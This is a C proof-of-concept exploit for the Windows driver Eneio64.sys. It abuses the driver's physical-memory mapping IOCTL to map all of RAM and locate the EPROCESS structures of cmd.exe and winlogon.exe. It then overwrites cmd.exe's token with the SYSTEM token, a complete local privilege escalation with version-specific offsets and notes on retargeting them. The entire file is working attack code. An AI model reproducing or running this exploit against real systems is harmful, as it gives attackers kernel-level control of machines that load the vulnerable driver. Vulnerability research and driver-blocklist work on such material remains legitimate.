#include "Types.h"
#include <stdio.h>
#include <stdint.h>

#pragma comment(lib, "ntdll.lib")

// RCX			SectionHandle = 0x9c
// RDX			ProcessHandle = 0xffffffffffffffff
// R8			BaseAddress = 0xfffffa8c7eb936b8 -> 0x0
// R9			ZeroBits = 0
// RSP+20		CommitSize = 41414141 42424242
// RSP+28		SectionOffset = 0xfffffa8c7eb936c0 -> 43434343 44444444
// RSP+30		ViewSize = 0xfffffa8c7eb93728 -> 41414141 42424242
// RSP+38		InheritDisposition = 0x1
// RSP+40		AllocationType = 0x0
// RSP+48		Win32Protect = 0x204

// Pool Tag value = 0x636f7250
// Unique Process ID = 0x2e0
// Token = 0x358
// Image File Name = 0x450

BOOL MapViewOfSection(NTSTATUS status,HANDLE hDevice, SECTION_MAP* buffer)
{
	IO_STATUS_BLOCK ioStatus;
	DWORD bytesReturned = 0;
	status = NtDeviceIoControlFile(hDevice, NULL, NULL, NULL, &ioStatus, IOCTL_GLCKIO_MAPPHYSTOLIN, buffer, sizeof(SECTION_MAP), buffer, sizeof(SECTION_MAP));

	if (status == 0)
	{
		return TRUE;
	}
	else
	{
		return FALSE;
	}
}

BOOL UnMapViewOfSection(NTSTATUS status, HANDLE hDevice, SECTION_MAP* buffer)
{
	IO_STATUS_BLOCK ioStatus;
	DWORD bytesReturned = 0;
	status = NtDeviceIoControlFile(hDevice, NULL, NULL, NULL, &ioStatus, IOCTL_GLCKIO_UNMAPPHYSADDR, buffer, sizeof(SECTION_MAP), buffer, sizeof(SECTION_MAP));

	if (status == 0)
	{
		return TRUE;
	}
	else
	{
		return FALSE;
	}
}

int main()
{
	wprintf(L"[*] PoC Exploit Arbitrary R/W (Eneio64.sys)\n");
	MEMORYSTATUSEX statex;
	statex.dwLength = sizeof(statex);
	GlobalMemoryStatusEx(&statex);
	int totalMemoryInGB = (int)(statex.ullTotalPhys / (1024 * 1024 * 1024));
	NTSTATUS status;
	HANDLE hDevice, eventHandle = NULL;
	UNICODE_STRING deviceName;
	OBJECT_ATTRIBUTES objAttr;
	IO_STATUS_BLOCK ioStatus;
	RtlInitUnicodeString(&deviceName, L"\\Device\\GLCKIo");
	InitializeObjectAttributes(&objAttr, &deviceName, OBJ_CASE_INSENSITIVE, 0, 0);
	wprintf(L"[^] Trying to open a handle to %ws\n", deviceName.Buffer);
	status = NtCreateFile(&hDevice, GENERIC_READ | GENERIC_WRITE, 
		&objAttr, &ioStatus, NULL, FILE_ATTRIBUTE_NORMAL, 
		FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_OPEN, 0, NULL, 0);

	if (status == 0)
	{
		wprintf(L"[^] Successfully got a handle => %p\n", hDevice);
		SECTION_MAP mapbuffer = { 0 };
		mapbuffer.CommitSize = (ULONGLONG)(1024 * 1024 * 1024) * totalMemoryInGB; // 9GB
		mapbuffer.SectionOffset = 0;
		BOOL success = MapViewOfSection(status,hDevice, &mapbuffer);

		if (success)
		{
			wprintf(L"[^] Memory mapped successfully\n");
		}
		else
		{
			wprintf(L"[!] NtDeviceIoControlFile failed with 0x%0x\n", status);
		}
		wprintf(L"[+] Mapped %llx bytes at address %p\n", mapbuffer.CommitSize, mapbuffer.BaseAddress);
		wprintf(L"[+] Kernel object address = %p\n", mapbuffer.Object);


		wprintf(L"[^] Press enter to start the exploit...\n");
		int i = getwchar();


		// Pool Tag
		ULONG PoolTagValue = 0x636f7250; // Hex representation of tag "Proc"

		// _EPROCESS offsets Win 10 rs5
		ULONGLONG UniqueProcessId = 0x2e0; // change this to target specific windows version
		ULONGLONG Token = 0x358;           // change this to target specific windows version
		ULONGLONG ImageFileName = 0x450;   // change this to target specific windows version

		// _EPROCESS temp vars
		ULONGLONG eprocess_cmd = 0x0;
		ULONGLONG eprocess_system = 0x0;

		PPOOL_HEADER ph; // POOL is kinda like HEAP in user-mode

		BYTE* base = (BYTE*)mapbuffer.BaseAddress;
		wprintf(L"[+] Scanning for EPROCESS addresses...\n");
		wprintf(L"[+] Time to grab some coffee...\n");

		// We need to iterate over mapped memory and look for pool header value. This pool headers are 0x10 hex aligned in memory.
		for (ULONGLONG i = 0x30000000; i < mapbuffer.CommitSize; i += 0x10)
		{
			// Read POOL_HEADER
			ph = (POOL_HEADER*)(base + i);

			// Now we are going to check if the tag matches our tag value that we found in windbg
			if (ph->PoolTag == PoolTagValue)
			{
				// Now we are going to calculate location of EPROCESS. Header size is 0x60 for System and 0x80 for our cmd.exe process
				for (ULONGLONG headersize = 0x70; headersize <= 0x80; headersize += 0x10)
				{
					ULONGLONG eprocess_base = (ULONGLONG)(base + i);
					ULONGLONG eprocess = eprocess_base + headersize;
					const char* name = (const char*)(eprocess + ImageFileName);
					
					// Filter other processes and invalid data
					if (!strcmp(name, "cmd.exe"))
					{
						wprintf(L"[+] Found cmd.exe at 0x%llx\n", eprocess);
						eprocess_cmd = eprocess;
					}
					else if (!strcmp(name, "winlogon.exe"))
					{
						wprintf(L"[+] Found winlogon.exe at 0x%llx\n", eprocess);
						eprocess_system = eprocess;
					}
				}
			}

			// If found both EPROCESS addresses then we overwrite the token with SYSTEM token from target process
			if (eprocess_cmd && eprocess_system)
			{
				wprintf(L"[+] Stealing SYSTEM Token...\n");
				EX_FAST_REF* systemToken = (EX_FAST_REF*)(eprocess_system + Token);
				EX_FAST_REF* cmdToken = (EX_FAST_REF*)(eprocess_cmd + Token);

				// Copy the system token to the cmd token
				*cmdToken = *systemToken;
				break;
			}
		}

		success = UnMapViewOfSection(status, hDevice, &mapbuffer);
		// Close Handle when finished
		NtClose(hDevice);
	}
	else
	{
		wprintf(L"[!] NtCreateFile failed with 0x%0x\n", status);
		return -1;
	}

	return 0;
}